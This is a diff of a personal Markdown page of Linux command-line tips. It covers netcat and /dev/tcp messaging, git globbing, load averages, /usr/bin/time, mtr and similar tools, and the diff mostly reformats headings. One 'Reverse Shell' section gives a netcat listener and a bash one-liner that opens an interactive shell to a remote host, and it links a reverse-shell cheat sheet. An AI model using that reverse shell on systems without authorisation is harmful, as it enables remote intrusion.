@@ -1,6 +1,7 @@
-cmak# Linux CLI tricks
+# Linux CLI Tricks
 
-# Send a string to an IP/port
+## Send a String to an IP/Port
+
 ```bash
 telnet 127.0.0.1 80
 
@@ -11,7 +12,8 @@ echo hello > /dev/tcp/127.0.0.1/80
 echo hello | nc localhost 80
 ```
 
-# Reverse shell
+## Reverse Shell
+
 ```bash
 # server
 nc -knvlp 3389
@@ -20,26 +22,29 @@ nc -knvlp 3389
 bash -i >& /dev/tcp/server_ip/3389 0>&1
 ```
 
-## See also
+## See Also
 
 - https://tldp.org/LDP/abs/html/x17974.html
 - https://highon.coffee/blog/reverse-shell-cheat-sheet/
 - https://catonmat.net/bash-one-liners-explained-part-three
 - http://docs.eggplantsoftware.com/epp/9.0.0/ePP/advovercoming_tcpip_connection_li.htm
 
-# Target everything but one file
-```
+## Target Everything but One File
+
+```bash
 git add !(unit.md)
 ```
 
-# Print a random line from a file
+## Print a Random Line from a File
+
 ```bash
 sed "$(( $RANDOM % $(cat readme.txt | wc -l) ))q;d" readme.txt
 
 shuf readme.txt | head -1
 ```
 
-# Epoch seconds
+## Epoch Seconds
+
 From bash 5.
 
 ```bash
@@ -50,7 +55,7 @@ $ echo $EPOCHSECONDS
 1614870876
 ```
 
-# uptime
+## Uptime
 
 The three load average values are 1, 5 and 15 minutes.
 
@@ -59,7 +64,7 @@ $ uptime
 15:29:28 up 20:23, 0 users, load average: 5.08, 1.49, 0.51
 ```
 
-# stress
+## Stress
 
 Stress your system in different ways.
 
@@ -67,12 +72,13 @@ Stress your system in different ways.
 $ stress --cpu 8
 ```
 
-# Number of processors
-```
+## Number of Processors
+
+```bash
 $ make -j $(nproc)
 ```
 
-# Synonyms for localhost
+## Synonyms for Localhost
 
 ```bash
 localhost
@@ -84,15 +90,15 @@ localhost
 0 # wut
 ```
 
-# Move a file out of the way
+## Move a File Out of the Way
 
 ```bash
 mv {,_}.bash_history
 ```
 
-# Verbose time
+## Verbose Time
 
-```
+```bash
 $ /usr/bin/time -v ls /
 bin dev home lib lib64 lost+found mnt proc run snap sys usr
 boot etc init lib32 libx32 media opt root sbin srv tmp var
@@ -121,17 +127,21 @@ Page size (bytes): 4096
 Exit status: 0
 ```
 
-# Vendor IDs
+## Vendor IDs
+
 View the latest on [ieee.org](http://standards-oui.ieee.org/oui.txt).
 
 To install on Ubuntu:
+
 ```bash
 sudo apt install --yes arp-scan
 get-oui
 ```
 
-# pushd equivalent
+## Pushd Equivalent
+
 I use this all the time. Rather than `pushd` and `popd` to navigate around the file system:
+
 ```bash
 # Navigate to new dir
 cd ~/deanturpin.gitlab.io/content/post
@@ -140,10 +150,12 @@ cd ~/deanturpin.gitlab.io/content/post
 cd -
 ```
 
-# Last argument
-I've used `esc shift -` to get the last argument from the previous command for a long time. But it's a little unweildy and you can do the same with `alt .`.
+## Last Argument
 
-# MTR: "my traceroute"
+I've used `esc shift -` to get the last argument from the previous command for a long time. But it's a little unwieldy and you can do the same with `alt .`.
+
+## MTR: "My Traceroute"
+
 Like tracepath/route but cooler.
 
 ```bash
@@ -178,5 +190,6 @@ Host Loss% Snt Last Avg Best Wrst StDev
 24. 35.185.44.232 0.0% 36 110.9 113.7 108.8 132.4 5.5
 ```
 
-# See also
+## See Also
+
 - https://github.blog/2015-06-08-how-to-undo-almost-anything-with-git/
